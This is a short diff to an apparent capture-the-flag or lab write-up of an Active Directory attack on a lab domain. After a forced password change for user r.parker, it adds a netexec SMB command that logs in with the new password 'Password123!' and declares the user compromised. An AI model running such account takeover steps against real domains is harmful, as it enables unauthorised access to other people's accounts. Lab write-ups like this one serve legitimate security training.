@@ -1074,4 +1074,13 @@ SMB         10.1.209.181    445    DC               [+] northstone.local\k.benne
 CHANGE-P... 10.1.209.181    445    DC               [+] Successfully changed password for r.parker
 ```
 
-Now the password should be changed i can verify this
+Now the password should be changed i can verify this to be safe:
+
+```python
+nxc smb dc.northstone.local -u r.parker -p 'Password123!'                                                    
+SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.209.181    445    DC               [+] northstone.local\r.parker:Password123!
+```
+
+This user is now compromised!
+
